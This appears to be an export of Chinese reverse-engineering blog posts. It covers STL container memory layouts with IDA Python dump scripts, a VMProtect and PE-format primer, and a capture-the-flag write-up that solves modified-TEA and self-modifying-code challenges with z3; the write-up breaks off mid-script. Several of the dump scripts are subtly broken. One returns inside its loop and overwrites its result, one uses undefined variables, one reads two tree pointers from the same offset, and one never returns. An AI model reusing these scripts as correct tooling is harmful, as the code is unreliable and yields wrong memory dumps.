    void f3()&#123;&#125;
    void f4()&#123;&#125;
&#125;;
</code></pre>
<p>现在我们需要设计一个模板 B，但发现，其实只需要组合一下模块 A 中的 f1()、f2()、f3()，就可以实现模板 B 需要的功能。其中 f1() 单独使用即可，而 f2() 和 f3() 需要组合起来使用，如下所示：</p>
<pre><code class="cpp">class B&#123;
private:
    A * a;
public:
    void g1()&#123;
        a-&gt;f1();
    &#125;
    void g2()&#123;
        a-&gt;f2();
        a-&gt;f3();
    &#125;
&#125;;
</code></pre>
<p>可以看到，就如同是电源适配器将不适用的交流电变得适用一样，模板 B 将不适合直接拿来用的模板 A 变得适用了，因此我们可以将模板 B 称为 B 适配器.</p>
<p>容器适配器也是同样的道理，<em>简单的理解容器适配器，其就是将不适用的序列式容器（包括 vector、deque 和 list）变得适用</em>。容器适配器的底层实现和模板 A、B 的关系是完全相同的，即通过封装某个序列式容器，并重新组合该容器中包含的成员函数，使其满足某些特定场景的需要。</p>
<p>stack（STL stack）容器适配器:采用默认的 deque 基础容器</p>
<p>queue容器适配器:其底层使用的基础容器选择默认的 deque 容器</p>
<p>priority_queue ：vector</p>
<p>逆向时处理容器适配器只需要用底层容器来处理即可</p>
<h1 id="STL-各高级类型dump数据"><a href="#STL-各高级类型dump数据" class="headerlink" title="STL 各高级类型dump数据"></a>STL 各高级类型dump数据</h1><h2 id="std-string"><a href="#std-string" class="headerlink" title="std::string"></a>std::string</h2><ul>
<li>固定长度 32 字节，4 个 dq</li>
<li>第一个指针字段指向数据地址</li>
<li>第二个 size_t 字段存储字符串长度</li>
</ul>
<p>内存分布：</p>
<p><img src="/./../images/image-20230120202731025.png" alt="image-20230120202731025"></p>
<p>IDA dump脚本：</p>
<pre><code class="py">def read_dbg_cppstr_64(objectAddr):
    # a easy function for read std:string
    # 首地址就是begin指针
    strPtr = idc.read_dbg_qword(objectAddr)
    result = &#39;&#39;
    i = 0
    while True:
        onebyte = idc.read_dbg_byte(strPtr + i)
        if onebyte == 0:
            break
        else:
            result = chr(onebyte)
        i += 1
        return result
</code></pre>
<h2 id="std-stringsteam"><a href="#std-stringsteam" class="headerlink" title="std::stringsteam"></a>std::stringsteam</h2><p>可以看作是读写文件</p>
<p>内存分布：<img src="/./../images/image-20230120203121252.png" alt="image-20230120203121252"></p>
<p><img src="/./../images/image-20230120203135198.png" alt="image-20230120203135198"></p>
<h2 id="std-vector"><a href="#std-vector" class="headerlink" title="std::vector"></a>std::vector</h2><ul>
<li>固定长度 24 字节，3 个 dq</li>
<li>第一个指针字段指向数组起始地址</li>
<li>第二个指针字段指向数组最后元素地址</li>
<li>第三个指针字段指向最大内存地址</li>
</ul>
<p>内存分布：<img src="/./../images/image-20230120203330744.png" alt="image-20230120203330744"></p>
<p>IDA dump脚本</p>
<pre><code class="py">def vetor_dump(addr):
    ELEMENT_SIZE = 8
    data_addr = []
    vetor_base = idc.read_dbg_qword(addr + 0x0)
    vetor_end = idc.read_dbg_qword(addr + 0x8)
    for i in range(vetor_base,vetor_end,ELEMENT_SIZE):
        data_addr.append(i)
    return data_addr
</code></pre>
<h2 id="std-list"><a href="#std-list" class="headerlink" title="std::list"></a>std::list</h2><ul>
<li>双向循环链表存储</li>
<li>头结构 + 节点结构</li>
<li>遍历长度可以用 size 字段确定</li>
</ul>
<p><img src="/./../images/image-20230120203453756.png" alt="image-20230120203453756"></p>
<p>内存布局：<img src="/./../images/image-20230120203507098.png" alt="image-20230120203507098"></p>
<p>IDA dump 脚本：</p>
<pre><code class="py">def dump_stl_list(p_list_addr):
    data_addr = []
    list_size = idc.read_dbg_qword(p_list_addr+0x10)
    cur_node = p_list_addr
    for i in range(list_size):
        cur_node = idc.read_dbg_qword(cur_node + 0x0)
        data_addr.append(cur_node + 0x10)
</code></pre>
<h2 id="std-deque"><a href="#std-deque" class="headerlink" title="std::deque"></a>std::deque</h2><ul>
<li>头结构 + 迭代器结构</li>
<li>适用 std::deque &#x2F; std::stack</li>
</ul>
<p><img src="/./../images/image-20230120203905814.png" alt="image-20230120203905814"></p>
<ol>
<li>stl_deque.start.node 确定first map 项位置</li>
<li>stl_deque.start.last - stl_deque.start.first 确定缓冲区大小</li>
<li>stl_deque.finish.node 确定last map 项位置</li>
<li>对于每一个 map 项： <ol>
<li>start 项，解析 cur, last 区间</li>
<li>finish 项，解析 start, cur 区间</li>
<li>其余项，解析 start, last 区间</li>
</ol>
</li>
</ol>
<p>内存布局:<img src="/./../images/image-20230120203718899.png" alt="image-20230120203718899"></p>
<p>IDA dump 脚本:</p>
<pre><code class="py">deque_iter = namedtuple(&#39;deque_iter&#39;,[&#39;cur&#39;,&#39;first&#39;,&#39;last&#39;,&#39;node&#39;])
def parse_iter(addr):
    # 解析队列迭代器
    cur = idc.read_dbg_qword(addr + 0x0)
    first = idc.read_dbg_qword(addr + 0x8)
    last = idc.read_dbg_qword(addr + 0x10)
    node = idc.read_dbg_qword(addr + 0x18)
    return deque_iter(cur,first,last,node)

def dump_deque(addr):
    ELEMENT_SIZE = 4    # std::deque&lt;xx&gt; xx 的类型大小来指定
    data_addr = []
    start_iter = parse_iter(addr + 0x10)
    finish_iter = parse_iter(addr + 0x30)
    buf_size = start_iter.last - start_iter.first
    map_size = start_iter.node
    map_finish = finish_iter.node

    # 解析第一个缓存数据
    for i in range(start_iter.cur,start_iter.last,ELEMENT_SIZE):
        data_addr.append(i)

    # 解析最后一个缓存数据
    for i in range(finish_iter.first,finish_iter.cur,ELEMENT_SIZE):
        data_addr.append(i)

    # 解析中间缓存数据
    for i in range(map_start + 8,map_finish - 8,8):
        buf_start = idc.read_dbg_qword(b)
        for i in range(buf_start,buf_start + buf_size, ELEMENT_SIZE):
            data_addr.append(i)
    return data_addr
</code></pre>
<h2 id="std-map"><a href="#std-map" class="headerlink" title="std::map"></a>std::map</h2><ul>
<li>底层采用 Rb-Tree 实现（红黑二叉树）</li>
<li>头结构 + 节点结构</li>
<li>用二叉树遍历可提取数据</li>
<li>适用 std::map &#x2F; std::set &#x2F; std::multimap &#x2F; std::multiset</li>
</ul>
<p>内存分布：<img src="/./../images/image-20230120204147238.png" alt="image-20230120204147238"></p>
<p>IDA dump 脚本：</p>
<pre><code class="py">def parse_gnu_map_header(address):
    root = idc.read_dbg_qword(address + 0x10)
    return root

def parse_gnu_map_node(address):
    left = idc.read_dbg_qword(address + 0x10)
    right = idc.read_dbg_dword(address + 0x10)
    data = address + 0x20
    return left, right, data

def parse_gnu_map_travel(address):
    # address &lt;—— std::map struct address
    result = []
    worklist = [parse_gnu_map_header(address)]
    while len(worklist) &gt; 0:
        addr = worklist.pop()
        (left, right, data) = parse_gnu_map_node(addr)
        if left &gt; 0: worklist.append(left)
        if right &gt; 0: worklist.append(right)
        result.append(data)
    return result
</code></pre>
<h2 id="std-unsorted-map"><a href="#std-unsorted-map" class="headerlink" title="std::unsorted_map"></a>std::unsorted_map</h2><ul>
<li>底层采用 HashTable 实现</li>
<li>头结构 + Bucket 数组 + 节点结构</li>
<li><strong>所有节点结构用单链表串联（****dump</strong> <strong>只需要遍历单链表）</strong></li>
<li><strong>头结构的第三个字段为单链表头</strong></li>
<li><strong>适用</strong> **std::**<strong>unsorted_map</strong> **&#x2F; std::**<strong>unsorted_set</strong> <strong>&#x2F; …</strong></li>
</ul>
<p>内存布局:<img src="/./../images/image-20230120204319472.png" alt="image-20230120204319472"></p>
<p>IDA dump 脚本:</p>
<pre><code class="py">def dump_stl_hashmap(addr):
    # dump stl hashmap gnu c++ x64
    data_addr = []
    bucket_addr = idc.read_dbg_qword(addr + 0x10)
    node_addr = bucket_addr
    while node_addr != 0:
        data_addr.append(node_addr + 0x8)
        node_addr = idc.read_dbg_qword(node_addr)
    return data_addr
</code></pre>
<h2 id="std-shared-ptr"><a href="#std-shared-ptr" class="headerlink" title="std::shared_ptr"></a>std::shared_ptr</h2><p>第一个指针就是数据指针</p>
<p>内存布局：<img src="/./../images/image-20230120204555397.png" alt="image-20230120204555397"></p>
<hr>
<h1 id="实战部分"><a href="#实战部分" class="headerlink" title="实战部分"></a>实战部分</h1>]]></content>
      <categories>
        <category>re</category>
        <category>Windows逆向</category>
      </categories>
  </entry>
  <entry>
    <title>VMProtect原理与还原(1)</title>
    <url>/2024/06/21/VMProtect%E5%8E%9F%E7%90%86%E4%B8%8E%E8%BF%98%E5%8E%9F-1/</url>
    <content><![CDATA[<p>​	工具、脱壳</p>
<span id="more"></span>

<h1 id="什么是VMProtect"><a href="#什么是VMProtect" class="headerlink" title="什么是VMProtect?"></a>什么是VMProtect?</h1><p>​	Virtual Machine Protect. 虚拟机保护</p>
<p>​	VMProtect的基本原则是通过使应用程序代码和逻辑变得非常复杂,<strong>执行虚拟化代码片段的虚拟机是嵌入到受保护应用程序的结果代码中的</strong>。</p>
<p>​	虚拟化代码，无需解码，不同于对代码进行加密&#x2F;解密，VMProtect让其在虚拟CPU上运行。而这个异于常规X36&#x2F;X64CPU的虚拟CPU，会对每个受保护的文件发出不同的指令集。</p>
<p>​	VMP有自己的虚拟CPU和虚拟指令集，那么对原生指令进行保护时，将原生指令转换为虚拟指令。</p>
<h2 id="还原效果："><a href="#还原效果：" class="headerlink" title="还原效果："></a>还原效果：</h2><p>原汇编代码：</p>
<pre><code class="assembly">lea eax,dword ptr ds:[edx+0x6]
add eax,ecx
retn
</code></pre>
<p>还原后代码：</p>
<pre><code class="assembly">lea dreg[3c], [ dreg[14] + 00000006 ]
lea dreg[00], [ dreg[08] + dreg[3c] ]  
retn
</code></pre>
<p><strong>我们看到寄存器还是虚拟寄存器，最后需要我们进行寄存器的转换分析，转换为真实寄存器，第二条</strong>lea<strong>指令经过寄存器变换，也将还原成add指令</strong></p>
<hr>
<h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><h2 id="dll的主要功能"><a href="#dll的主要功能" class="headerlink" title="dll的主要功能"></a>dll的主要功能</h2><h2 id="kernel32-dll"><a href="#kernel32-dll" class="headerlink" title="kernel32.dll"></a><strong>kernel32.dll</strong></h2><p>kernel32.dll是Windows 9x&#x2F;Me中非常重要的32位动态链接库文件，属于内核级文件。它控制着<strong>系统的内存管理、数据的输入输出操作和中断处理</strong>，当Windows启动时，kernel32.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域。</p>
<h3 id="user32-dll"><a href="#user32-dll" class="headerlink" title="user32.dll"></a><strong>user32.dll</strong></h3><p>user32.dll是Windows用户界面相关应用程序接口，用于包括<strong>Windows处理，基本用户界面</strong>等特性，如<strong>创建窗口和发送消息</strong>。</p>
<p>在早期32-bit 版本的Windows中，用户控件是在ComCtl32中实现的，但是一些控件的显示功能是在User32.dll中实现的。例如在一个窗口中非客户区域（边框和菜单）的绘制就是由User32.dll来完成的。User32.dll 是操作系统的一个核心控件，它和操作系统是紧密联系在一起的。也就是说，不同版本的Windows中User32.dll 是不同。因此，应用程序在不同版本的Windows中运行的时候，由于User32.dll的不同，会导致应用程序的界面通常会有微小的不同。</p>
<h3 id="gdi32-dll"><a href="#gdi32-dll" class="headerlink" title="gdi32.dll"></a><strong>gdi32.dll</strong></h3><p>gdi32.dll是Windows GDI<strong>图形用户界面相关程序，包含的函数用来绘制图像和显示文字</strong></p>
<h3 id="comdlg32-dll"><a href="#comdlg32-dll" class="headerlink" title="comdlg32.dll"></a><strong>comdlg32.dll</strong></h3><p>comdlg32.dll是Windows应用程序<strong>公用对话框模块</strong>，用于例如打开文件对话框。</p>
<h3 id="advapi32-dll"><a href="#advapi32-dll" class="headerlink" title="advapi32.dll"></a><strong>advapi32.dll</strong></h3><p>advapi32.dll是一个高级API应用程序接口服务库的一部分，包含的函数与对象的安全性，注册表的操控以及事件日志有关。</p>
<h3 id="shell32-dll"><a href="#shell32-dll" class="headerlink" title="shell32.dll"></a><strong>shell32.dll</strong></h3><p>shell32.dll是Windows的32位<strong>外壳动态链接库文件</strong>，用于打开网页和文件，建立文件时的默认文件名的设置等大量功能。</p>
<p>严格来讲，它只是代码的合集，真正执行这些功能的是操作系统的相关程序，dll文件只是根据设置调用这些程序的相关功能罢了。</p>
<h3 id="ole32-dll"><a href="#ole32-dll" class="headerlink" title="ole32.dll"></a><strong>ole32.dll</strong></h3><p>ole32.dll是对象链接和嵌入相关模块。</p>
<h3 id="odbc32-dll"><a href="#odbc32-dll" class="headerlink" title="odbc32.dll"></a><strong>odbc32.dll</strong></h3><p>odbc32.dll是ODBC数据库查询相关文件。 </p>
<h3 id="PE文件格式"><a href="#PE文件格式" class="headerlink" title="PE文件格式"></a>PE文件格式</h3><p>PE结构可以大致分为:</p>
<ul>
<li><p>DOS部分	u_IMAGE_DOS_HEADER</p>
<pre><code class="assembly">typedef struct _IMAGE_DOS_HEADER 
&#123;      
    WORD   e_magic;                      
    WORD   e_cblp;                         
    WORD   e_cp;                            
    WORD   e_crlc;                          
    WORD   e_cparhdr;                   
    WORD   e_minalloc;                  
    WORD   e_maxalloc;                 
    WORD   e_ss;                            
    WORD   e_sp;                            
    WORD   e_csum;                       
    WORD   e_ip;                            
    WORD   e_cs;        
        WORD   e_lfarlc;                        
    WORD   e_ovno;                       
    WORD   e_res[4];                      
    WORD   e_oemid;                     
    WORD   e_oeminfo;                  
    WORD   e_res2[10];                  
    LONG    e_lfanew;                      
&#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
</code></pre>
<p>该结构体中需要掌握的字段只有 2 个，分别是第一个字段 <code>e_magic</code> 和最后一个字段 <code>e_lfanew</code> 字段</p>
<p><code>e_magic</code>字段:<br>DOS 可执行文件的标识符，占用 2 字节。该位置保存着的字符是“MZ”</p>
<p><code>e_lfanew</code>字段：<br>保存着PE头的起始位置。</p>
<p>作用：</p>
<ul>
<li><code>定位PE文件头开始位置</code>，也可用于<code>PE文件合法性检测</code></li>
</ul>
</li>
</ul>
<p>​	u_IMAGE_NT_HEADERS NT头（PE头）</p>
<p>DOS头偏移多少是PE头位置</p>
<pre><code class="assembly">typedef struct _IMAGE_NT_HEADERS 
&#123;  
    DWORD Signature;  //PE标识
    IMAGE_FILE_HEADER FileHeader;  	
    IMAGE_OPTIONAL_HEADER OptionalHeader;

&#125; IMAGE_NT_HEADERS, *PIMAGE_NT_HEADERS;
</code></pre>
<ul>
<li>PE文件头   u_IMAGE_FILE_HEADER</li>
</ul>
<pre><code class="assembly">typedef struct _IMAGE_FILE_HEADER 
&#123;  
    WORD Machine;  
    WORD NumberOfSections;  //主要关心区段数目
    DWORD TimeDateStamp;  
    DWORD PointerToSymbolTable;  
    DWORD NumberOfSymbols;  
    WORD SizeOfOptionalHeader;  
    WORD Characteristics;
&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
</code></pre>
<p><strong>_IMAGE_OPTIONAL_HEADER</strong></p>
<pre><code class="assembly">typedef struct _IMAGE_OPTIONAL_HEADER 
&#123;  
    WORD Magic;  
    BYTE MajorLinkerVersion;  
    BYTE MinorLinkerVersion;  
    DWORD SizeOfCode;  
    DWORD SizeOfInitializedData;  
    DWORD SizeOfUninitializedData;  
    DWORD AddressOfEntryPoint;  //入口点
    DWORD BaseOfCode;  
    DWORD BaseOfData;  
    DWORD ImageBase;  //映像基地址/模块地址
    DWORD SectionAlignment;  //区段对齐
    DWORD FileAlignment;  	//文件对齐
    WORD  MajorOperatingSystemVersion;  
    WORD  MinorOperatingSystemVersion;  
    WORD  MajorImageVersion;  
    WORD  MinorImageVersion;  
    WORD  MajorSubsystemVersion;  
    WORD  MinorSubsystemVersion;  
    DWORD    Win32VersionValue;  
    DWORD    SizeOfImage;  //映像大小
    DWORD    SizeOfHeaders;  
    DWORD    CheckSum;  
    WORD     Subsystem;  
    WORD     DllCharacteristics;  //dll属性
    DWORD    SizeOfStackReserve;  
    DWORD    SizeOfStackCommit;  
    DWORD SizeOfHeapReserve;  
    DWORD SizeOfHeapCommit;  
    DWORD LoaderFlags;  
    DWORD NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];//数据目录包含在选项头里
&#125; IMAGE_OPTIONAL_HEADER, *PIMAGE_OPTIONAL_HEADER;
</code></pre>
<ul>
<li>节数据(块数据) u_IMAGE_DATA_DIRECTORY</li>
</ul>
<pre><code class="c">typedef struct _IMAGE_DATA_DIRECTORY 
&#123;
    DWORD   VirtualAddress;
    DWORD   Size;
&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES    16	//16个数据目录
</code></pre>
<ul>
<li>区域段结构 u_IMAGE_SECTION_HEADER</li>
</ul>
<pre><code class="c">typedef struct _IMAGE_SECTION_HEADER 
&#123;
    BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];//区段名称
    union &#123;
            DWORD   PhysicalAddress;
            DWORD   VirtualSize;//程序加载后区段大小
    &#125; Misc;
    DWORD   VirtualAddress;//程序加载后区段地址
    DWORD   SizeOfRawData;//文件中数据大小
    DWORD   PointerToRawData;//文件中数据偏移
    DWORD   PointerToRelocations;
    DWORD   PointerToLinenumbers;
    WORD    NumberOfRelocations;
    WORD    NumberOfLinenumbers;
    DWORD   Characteristics;//区段属性
&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

#define IMAGE_SIZEOF_SECTION_HEADER          40
</code></pre>
<ul>
<li>调试信息</li>
</ul>
]]></content>
      <categories>
        <category>re</category>
        <category>前置知识学习</category>
      </categories>
      <tags>
        <tag>VMProtect</tag>
      </tags>
  </entry>
  <entry>
    <title>NOV X联合出题人</title>
    <url>/2022/11/29/buuctf-nov/</url>
    <content><![CDATA[<p>​	比赛一直在打安洵杯，buu都没好好看，现在安洵杯迷宫题斜着走还没搞明白，先来复现一波buu的月赛</p>
<span id="more"></span>

<h1 id="babytea"><a href="#babytea" class="headerlink" title="babytea"></a>babytea</h1><h1 id="1-一-看核心算法经典tea"><a href="#1-一-看核心算法经典tea" class="headerlink" title="1.	 一 看核心算法经典tea"></a>1.	 一 看核心算法经典tea<img src="/./../images/image-20221129172038310.png" alt="image-20221129172038310"></h1><h2 id="2-结果脚本算不出来-x3D-x3D-，我还以为老子脚本有问题，动调发现有异常，直接去看汇编，结果发现果然存在几个异常点"><a href="#2-结果脚本算不出来-x3D-x3D-，我还以为老子脚本有问题，动调发现有异常，直接去看汇编，结果发现果然存在几个异常点" class="headerlink" title="2.	结果脚本算不出来&#x3D;&#x3D;，我还以为老子脚本有问题，动调发现有异常，直接去看汇编，结果发现果然存在几个异常点"></a>2.	结果脚本算不出来&#x3D;&#x3D;，我还以为老子脚本有问题，动调发现有异常，直接去看汇编，结果发现果然存在几个异常点</h2><h3 id="a-sum-异常"><a href="#a-sum-异常" class="headerlink" title="a)sum+异常"></a>a)sum+异常<img src="/./../images/image-20221129172501520.png" alt="image-20221129172501520"></h3><h3 id="b-开头也有异常，而且这个是默认必须跳转"><a href="#b-开头也有异常，而且这个是默认必须跳转" class="headerlink" title="b)开头也有异常，而且这个是默认必须跳转"></a>b)开头也有异常，而且这个是默认必须跳转<img src="/./../images/image-20221129172612239.png" alt="image-20221129172612239"></h3><h2 id="3-直接修改汇编，让报错的地方直接跳转到异常处理程序"><a href="#3-直接修改汇编，让报错的地方直接跳转到异常处理程序" class="headerlink" title="3.直接修改汇编，让报错的地方直接跳转到异常处理程序"></a>3.直接修改汇编，让报错的地方直接跳转到异常处理程序<img src="/./../images/image-20221129172922988.png" alt="image-20221129172922988"></h2><h2 id="4-然后源码就变了"><a href="#4-然后源码就变了" class="headerlink" title="4.然后源码就变了"></a>4.然后源码就变了<img src="/./../images/image-20221129173019067.png" alt="image-20221129173019067"></h2><h2 id="5-但是v5地方不是每次都要异或，是有条件的，当-gt-gt-0x1f-x3D-x3D-0时异或"><a href="#5-但是v5地方不是每次都要异或，是有条件的，当-gt-gt-0x1f-x3D-x3D-0时异或" class="headerlink" title="5.但是v5地方不是每次都要异或，是有条件的，当&gt;&gt;0x1f &#x3D;&#x3D; 0时异或"></a>5.但是v5地方不是每次都要异或，是有条件的，当&gt;&gt;0x1f &#x3D;&#x3D; 0时异或<img src="/./../images/image-20221129173152401.png" alt="image-20221129173152401"></h2><h2 id="6-总之这是一道魔改tea罢了，脚本如下"><a href="#6-总之这是一道魔改tea罢了，脚本如下" class="headerlink" title="6.总之这是一道魔改tea罢了，脚本如下"></a>6.总之这是一道魔改tea罢了，脚本如下</h2><pre><code class="python">from Crypto.Util.number import *
def tea(v,k,d38,d3c):
    v0 = v[0]
    v1 = v[1]
    s = 0
    j = [0]
    # sum
    for i in range(32):
        s = (s + dword_41F000)&amp;0xffffffff
        if (s &gt;&gt; 0x1f) == 0:
            s ^= 0x1234567
        j.append(s) 
    sum = j[32]
    for i in range(32):
        v1 -= (k[3] + (v0 &gt;&gt; 5)) ^ (sum + v0) ^ (k[2] + 16 * v0)
        v1 = v1&amp;0xffffffff
        v0 -= (k[1] + (v1 &gt;&gt; 5)) ^ (sum + v1) ^ (k[0] + 16 * v1)
        v0 = v0&amp;0xffffffff
        sum = j[31-i]
    v0 ^= d38
    v1 ^= d3c
    v[0] = v0&amp;0xffffffff
    v[1] = v1&amp;0xffffffff

enc = [0x5E27B530, 0x0BDBEF7F3, 0x0E3516A8F, 0x5D836CFE, 0x0D83DFA09, 0x8EFC737A,0x55A853A3, 0x7A564EC5]
k = [0x67452301, 0x0EFCDAB89, 0x98BADCFE, 0x10325476]
m = [None]*2
flag = []
dword_41F038 = [0x1234567,0x5E27B530,0x0E3516A8F,0x0D83DFA09]
dword_41F03C = [0x89ABCDEF,0x0BDBEF7F3,0x5D836CFE,0x8EFC737A]
dword_41F000 = 0x9E3779B1
for i in range(4):
    m[0] = enc[2*i]
    m[1] = enc[2*i+1]
    tea(m,k,dword_41F038[i],dword_41F03C[i])
    flag.append(long_to_bytes(m[0])[::-1])
    flag.append(long_to_bytes(m[1])[::-1])
b&#39;&#39;.join(flag)
#600d_y0u_r34lly_kn0w_734_4nd_53h
</code></pre>
<hr>
<h1 id="babysmc"><a href="#babysmc" class="headerlink" title="babysmc"></a>babysmc</h1><h3 id="1-smc函数，但是异或值是输入的值"><a href="#1-smc函数，但是异或值是输入的值" class="headerlink" title="1.	smc函数，但是异或值是输入的值"></a>1.	smc函数，但是异或值是输入的值<img src="/./../images/image-20221130165909641.png" alt="image-20221130165909641"></h3><h3 id="2-其他也没有和输入值相关的函数，所以只能选择爆破"><a href="#2-其他也没有和输入值相关的函数，所以只能选择爆破" class="headerlink" title="2.	其他也没有和输入值相关的函数，所以只能选择爆破"></a>2.	其他也没有和输入值相关的函数，所以只能选择爆破<img src="/./../images/image-20221130170030329.png" alt="image-20221130170030329"></h3><h3 id="3-当爆破到第一个操作时push-ebp时那就成功了，所以硬编码就为0x55，先是loc50，第一个值是57"><a href="#3-当爆破到第一个操作时push-ebp时那就成功了，所以硬编码就为0x55，先是loc50，第一个值是57" class="headerlink" title="3.	当爆破到第一个操作时push ebp时那就成功了，所以硬编码就为0x55，先是loc50，第一个值是57"></a>3.	当爆破到第一个操作时push ebp时那就成功了，所以硬编码就为0x55，先是loc50，第一个值是57<img src="/./../images/image-20221130170339966.png" alt="image-20221130170339966"></h3><h3 id="4-但是爆破失败，真的是糟糕！！！"><a href="#4-但是爆破失败，真的是糟糕！！！" class="headerlink" title="4.	但是爆破失败，真的是糟糕！！！"></a>4.	但是爆破失败，真的是糟糕！！！<img src="/./../images/image-20221130170528580.png" alt="image-20221130170528580"></h3><h3 id="5-后面发现还有一个函数，这个函数居然爆破成功了，奇了个怪"><a href="#5-后面发现还有一个函数，这个函数居然爆破成功了，奇了个怪" class="headerlink" title="5.	后面发现还有一个函数，这个函数居然爆破成功了，奇了个怪"></a>5.	后面发现还有一个函数，这个函数居然爆破成功了，奇了个怪<img src="/./../images/image-20221130170643748.png" alt="image-20221130170643748"></h3><h3 id="6-后面惊奇地发现第一个函数应该被异或了两次，进过256长度的计算，确实如此"><a href="#6-后面惊奇地发现第一个函数应该被异或了两次，进过256长度的计算，确实如此" class="headerlink" title="6.	后面惊奇地发现第一个函数应该被异或了两次，进过256长度的计算，确实如此"></a>6.	后面惊奇地发现第一个函数应该被异或了两次，进过256长度的计算，确实如此<img src="/./../images/image-20221130170821019.png" alt="image-20221130170821019"></h3><h3 id="7-然后就爆破出来了，yes，用idc改编码"><a href="#7-然后就爆破出来了，yes，用idc改编码" class="headerlink" title="7.	然后就爆破出来了，yes，用idc改编码"></a>7.	然后就爆破出来了，yes，用idc改编码<img src="/./../images/image-20221130170946128.png" alt="image-20221130170946128"></h3><h3 id="8-改完之后从修改开始处到return代码全部重新分析一遍，因为256长度把已经分析了的代码也改了，然后重新生成函数"><a href="#8-改完之后从修改开始处到return代码全部重新分析一遍，因为256长度把已经分析了的代码也改了，然后重新生成函数" class="headerlink" title="8.	改完之后从修改开始处到return代码全部重新分析一遍，因为256长度把已经分析了的代码也改了，然后重新生成函数"></a>8.	改完之后从修改开始处到return代码全部重新分析一遍，因为256长度把已经分析了的代码也改了，然后重新生成函数<img src="/./../images/image-20221129213724788.png"></h3><h3 id="9-然后逻辑就是循环十次，不同函数调用十次，最后用z3解"><a href="#9-然后逻辑就是循环十次，不同函数调用十次，最后用z3解" class="headerlink" title="9.	然后逻辑就是循环十次，不同函数调用十次，最后用z3解"></a>9.	然后逻辑就是循环十次，不同函数调用十次，最后用z3解<img src="/./../images/image-20221130172042777.png" alt="image-20221130172042777"></h3><h3 id="这里附上代码，仅供参考"><a href="#这里附上代码，仅供参考" class="headerlink" title="这里附上代码，仅供参考"></a>这里附上代码，仅供参考</h3><pre><code class="python">from z3 import *
dword_422040 = [0x00027FC8, 0x00029049, 0x0003336C, 0x0002C6A7, 0x00036CB0, 0x0001F2BB, 0x00035262, 0x0002AEDF, 0x0002955E, 0x0002EE10, 0x0002B057, 0x0002FDE8, 0x00029B92, 0x00035842, 0x000294D2, 0x0002B984]

flag = [0] * 34
s = Solver()
a1 = [BitVec(f&#39;flag[&#123;i&#125;]&#39;,8) for i in range(17,33)]
s.add(dword_422040[0] == (159 * a1[8] \
                          + 109 * a1[12] \
                          + 14 * a1[0] \
                          + 92 * a1[14] \
                          + 211 * a1[4] \
                          + 178 * a1[7] \
                          + 57 * a1[2] \
                          + 175 * a1[5] \
                          + 170 * a1[11] \
                        + 59 * a1[6] \
                          + 200 * a1[9] \
                          + 5 * a1[15] \
                          + 48 * a1[13] \
                          + 28 * a1[3] \
                          + 18 * a1[10] \
                          + 228 * a1[1])&amp;0xffffffff)
s.add(dword_422040[6] == (173 * a1[11] \
                          + 34 * a1[5] \
                          + 69 * a1[4] \
                          + 216 * a1[14] \
                          + 225 * a1[9] \
                          + 160 * a1[1] \
                          + 207 * a1[10] \
                          + 175 * a1[7] \
                          + 121 * a1[0] \
                          + 122 * a1[2] \
                          + 179 * a1[12] \
                          + 91 * a1[13] \
                          + 181 * a1[8] \
                          + 93 * a1[3] \
                          + 121 * a1[6] \
                          + 12 * a1[15])&amp;0xffffffff)
s.add(dword_422040[8] == (215 * a1[11] \
                          + 164 * a1[5] \
                          + 97 * a1[2] \
                          + 99 * a1[3] \
                          + 188 * a1[4] \
                          + ((a1[9] &lt;&lt; 7)&amp;0xffffffff) \
                          + 214 * a1[6] \
                          + 106 * a1[8] \
                          + 169 * a1[0] \
                          + 28 * a1[14] \
                          + 18 * a1[12] \
                          + a1[1] \
                          + 177 * a1[10] \
                          + 114 * a1[7] \
                          + 176 * a1[15] \
                          + 25 * a1[13])&amp;0xffffffff)
s.add(dword_422040[9] == (175 * a1[14] \
                          + 42 * a1[4] \
                          + 214 * a1[12] \
                          + 43 * a1[13] \
                          + 147 * a1[6] \
                          + 53 * a1[10] \
                          + 12 * a1[1] \
                          + 213 * a1[7] \
                          + 241 * a1[9] \
                          + 223 * a1[5] \
                          + 65 * a1[3] \
                          + 42 * a1[15] \
                          + 131 * a1[2] \
                          + 81 * a1[0] \
                          + 92 * a1[11] \
                          + 110 * a1[8])&amp;0xffffffff)
s.add(dword_422040[13] == (57 * a1[0] \
                           + 109 * a1[7] \
                           + 60 * a1[2] \
                           + 228 * a1[13] \
                           + 166 * a1[4] \
                           + 236 * a1[9] \
                           + 100 * a1[6] \
                           + 179 * a1[11] \
                           + 20 * a1[12] \
                           + 45 * a1[8] \
                           + 204 * a1[3] \
                           + 182 * a1[14] \
                           + 84 * a1[10] \
                           + 170 * a1[15] \
                           + 199 * a1[5] \
                           + 138 * a1[1])&amp;0xffffffff)
s.add(dword_422040[10] == (98 * a1[11] \
                           + 122 * a1[9] \
                           + 237 * a1[12] \
                           + 117 * a1[0] \
                           + 34 * a1[3] \
                           + 168 * a1[8] \
                           + 135 * a1[10] \
                           + 119 * a1[6] \
                           + 91 * a1[2] \
                           + 161 * a1[15] \
                           + 152 * a1[7] \
                           + 186 * a1[4] \
                           + 187 * a1[13] \
                           + 72 * a1[14] \
                           + 36 * a1[5] \
                           + 171 * a1[1])&amp;0xffffffff)
s.add(dword_422040[7] == (184 * a1[9] \
                          + 112 * a1[0] \
                          + 107 * a1[11] \
                          + 170 * a1[13] \
                          + 55 * a1[8] \
                          + 85 * a1[14] \
                          + 212 * a1[10] \
                          + 173 * a1[15] \
                          + 166 * a1[12] \
                          + 142 * a1[4] \
                          + 202 * a1[5] \
                          + 63 * a1[2] \
                          + 30 * a1[7] \
                          + 175 * a1[3] \
                          + 217 * a1[6] \
                          + 63 * a1[1])&amp;0xffffffff)
s.add(dword_422040[15] == (((a1[7] &lt;&lt; 6)&amp;0xffffffff) \
                           + 228 * a1[4] \
                           + 90 * a1[11] \
                           + 85 * a1[3] \
                           + 196 * a1[6] \
                           + 219 * a1[0] \
